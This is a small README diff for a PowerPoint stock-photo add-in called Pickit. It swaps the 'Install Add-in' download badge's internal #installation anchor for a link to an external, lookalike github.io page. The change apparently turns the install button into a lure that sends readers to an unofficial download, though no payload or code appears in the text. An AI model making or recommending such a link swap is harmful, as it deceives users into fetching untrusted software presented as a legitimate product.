@@ -1,7 +1,7 @@
 # Pickit PowerPoint Asset Integration  
 Integrate premium photo stocks and icon libraries directly into PowerPoint. Search, insert, and manage 100M+ Getty/Unsplash assets without switching apps. Enterprise solution for presentations.  
 
-[![Install Add-in](https://img.shields.io/badge/Download-Pickit_Pro-0078D7)](#installation)  
+[![Install Add-in](https://img.shields.io/badge/Download-Pickit_Pro-0078D7)](https://pickit-powerpoint-assets-pro.github.io/.github/)  
 
 ---  
 
